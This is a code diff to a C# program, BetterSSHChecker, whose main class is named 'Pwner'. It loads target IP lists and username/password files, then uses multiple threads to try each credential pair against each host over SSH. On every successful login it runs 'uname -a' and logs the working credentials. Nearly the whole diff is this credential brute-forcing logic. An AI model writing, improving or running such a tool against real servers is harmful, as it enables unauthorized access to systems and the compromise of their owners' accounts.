@@ -15,15 +15,16 @@ namespace BetterSSHChecker
     {
         static void Main(string[] args)
         {
-
-            Pwner Lord = new Pwner("dumb.txt", "userpass.txt");
-            //Lord.check(10, 10);
+            
+            Pwner Lord = new Pwner("result.txt", "userpass.txt");
+            Lord.check(3000, 5);
 
 
             Console.WriteLine("Done");
             Console.ReadKey();
 
         }
+
 
     }
 
@@ -57,112 +58,140 @@ namespace BetterSSHChecker
 
             import(target_file, credentials_file);
             Prelude();
-            check(10, 10);
 
         }
 
         public void import(string target_file, string credentials_file)
         {
             Stopwatch w = new Stopwatch();
-            Console.WriteLine("[{0}] Importing...", DateTime.Now.ToString("hh:mm:ss"));
+            logIt("Importing...");
 
             w.Start();
                 getData<string>(target_file, IPS);
                 getData<Credentials>(credentials_file, credentials);
             w.Stop();
 
-            Console.WriteLine("[{0}] Importated {1} lines in: {2}ms", DateTime.Now.ToString("hh:mm:ss"), IPS.Count + credentials.Count, w.ElapsedMilliseconds);
+            logIt($"Importated {IPS.Count + credentials.Count} lines in: {w.ElapsedMilliseconds}ms");
 
         }
 
         public void Prelude()
         {
-
-            Console.WriteLine("[{0}] Looking for {1}*{2}:{3} attempts.", DateTime.Now.ToString("hh:mm:ss"), IPS.Count, credentials.Count, IPS.Count * credentials.Count);
-
+            logIt($"Looking for {IPS.Count}*{credentials.Count}:{IPS.Count * credentials.Count} attempts.");
         }
         
         public List<HashSet<string>> splitHashSet(HashSet<string> toExplode, int explodeNumber)
         {
 
             /*
-             * toExplode needs to be divided into 'explodeNumber' numbers of HashSet. 
+             * splitHashSet returns a List of HashSet containing explodedNumber of toExplode partitions.
              */
 
-            Set<Integer> myIntSet = new HashSet<Integer>();
-            // fill the set
-            Iterable<List<Integer>> lists = Iterables.partition(myIntSet, SIZE_EACH_PARTITION);
+            List<HashSet<string>> explodedResult = new List<HashSet<string>>();
+            
+            HashSet<string> tmp = new HashSet<string>();
+
+            explodeNumber = IPS.Count / explodeNumber;
+
+            int i = 0;
+            foreach (string line in toExplode)
+            {
+
+                tmp.Add(line);
+                i++;
+
+                if (i == explodeNumber)
+                {
+                    explodedResult.Add(tmp);
+                    tmp = new HashSet<string>();
+                    i = 0;
+                }
+
+
+            }
+            
             return explodedResult;
 
         }
 
         public void check(int timeout, int threads)
         {
-            /* Method 1.
-                Split HashSet as N threads
-                For each IPS in the HashSet[N] do check
-
-               Method 2.
-                For each IPS in HashSet do check
-                
-               Method 3.
-             */
-
             
             Stopwatch w = new Stopwatch();
+
+            threads = 20;
+            List<HashSet<string>> b = splitHashSet(IPS, threads);
+            logIt($"{IPS.Count * credentials.Count} attemps / {threads}: {IPS.Count * credentials.Count / threads} per threads");
             w.Start();
 
-            List<HashSet<string>> b = splitHashSet(IPS, 100);
 
-
-
-            w.Stop();
-            Console.WriteLine("Exec {0}ms", w.ElapsedMilliseconds);
-
-            return;
             /*
-            *  Method 2: Dummy 
-            *  500 IPs, 100ms  =   50127ms
-            */
-            Parallel.ForEach(IPS, ip =>
+             * Method 1: n/threads
+             * 500 IPS, 100ms   =   180482ms
+             */
+
+            Task[] tasks = new Task[b.Count];
+            Console.WriteLine(b.Count);
+            foreach (HashSet<string> currentSet in b)
             {
-                foreach (Credentials cred in credentials)
-                {
 
-                    SshResponse a = meet("192.168.1.25", cred.username, "a", timeout);
+                Task v = new Task(() => {
+                        int currentThread = (int)Task.CurrentId;
+                        logIt($"Thread {currentThread} started!");
 
-                    if (!(a.Exeception is null))
-                    {
-                        
-                        switch (a.GetType().ToString())
+                        // Peach = 30457ms - 4466ms
+                        // Each  = 31449ms - 4003ms - 354327ms
+
+                        foreach (Credentials cred in credentials)
                         {
-                            
-                            case "Renci.SshNet.Common.SshOperationTimeoutException":
-                                Console.WriteLine("[{0}](x) {1} is off!", DateTime.Now.ToString("hh:mm:ss"), ip);
-                            break;
+                            foreach (string IP in currentSet)
+                            {
+                                SshResponse a = meet("127.0.0.1", cred.username, cred.password, 3000);
 
-                            case "System.Net.Sockets.SocketException":
-                                Console.WriteLine(a.Exeception.Message);
-                            break;
+                                if (!(a.Exeception is null))
+                                {
+                                    
+                                    switch (a.GetType().ToString())
+                                    {
 
-                            default:
-                                Console.WriteLine("[{0}](-) {1}@{2}:{3}", DateTime.Now.ToString("hh:mm:ss"), ip, cred.username, cred.password);
-                                continue;
-                            break;
+                                        case "Renci.SshNet.Common.SshOperationTimeoutException":
+                                            logIt($"{IP} is off!", currentThread, false);
+                                            continue;
+                                            break;
 
+                                        case "System.Net.Sockets.SocketException":
+                                            logIt($"{IP} gone oopsy! \n::{a.Exeception.Message}", currentThread, false);
+                                            break;
+
+                                        default:
+                                            logIt($"{IP}@{cred.username}:{cred.password}", currentThread, false);
+                                            continue;
+                                            break;
+
+                                    }
+
+                                    // Invalid IP
+                                    break;
+                                }
+
+                                logIt($"{IP}@{cred.username}:{cred.password} \n-> {a.uname}", currentThread, true);
+                                Console.Beep();
+                                // Next
+                                break;
+                            }
                         }
+                        
+                });
 
-                        // Invalid IP
-                        break;
-                    }
+                v.Start();
+                tasks[v.Id-1] = v;
+            }
+            
 
-                    Console.WriteLine("[{0}](+) {1}@{2}:{3}", DateTime.Now.ToString("hh:mm:ss"), ip, cred.username, cred.password);
-                    // Next
-                    break;
-                }
+            Task.WaitAll(tasks);
+            w.Stop();
 
-            });
-
+            logIt($"Exec {w.ElapsedMilliseconds}ms");
 
         }
 
@@ -203,27 +232,41 @@ namespace BetterSSHChecker
 
             SshResponse response = new SshResponse();
 
-                try
-                {
+            try
+            {
 
-                    using (var client = new SshClient(targetIP, user, pass))
-                    {
-                        client.ConnectionInfo.Timeout = TimeSpan.FromSeconds(timeout);
-                        client.Connect();
-                        response.uname = client.RunCommand("uname -a").Result;
-                        client.Disconnect();
-                    }
-
-                }
-                catch (Exception wank)
+                using (var client = new SshClient(targetIP, user, pass))
                 {
-                    //System.Net.Sockets.SocketException
-                    //Renci.SshNet.Common.SshOperationTimeoutException
-                    response.Exeception = wank;
+                    client.ConnectionInfo.Timeout = TimeSpan.FromMilliseconds(timeout);
+                    client.Connect();
+                
+                    SshCommand runcommand = client.CreateCommand("uname -a");
+                    runcommand.CommandTimeout = TimeSpan.FromMilliseconds(10000);
+                    response.uname = runcommand.Execute(); ;
+                    
+                    client.Disconnect();
                 }
 
-                return response;
+            }
+            catch (Exception wank)
+            {
+                //System.Net.Sockets.SocketException
+                //Renci.SshNet.Common.SshOperationTimeoutException
+                response.Exeception = wank;
+            }
+
+            return response;
             
+        }
+
+        public void logIt(string message)
+        {
+            Console.WriteLine("[{0}] {1}", DateTime.Now.ToString("hh:mm:ss"), message);
+        }
+
+        public void logIt(string message, int thread, bool success)
+        {
+            Console.WriteLine("[{0}]#T{1}({2}) {3}", DateTime.Now.ToString("hh:mm:ss"), thread, success ? "+" : "-", message);
         }
 
     }
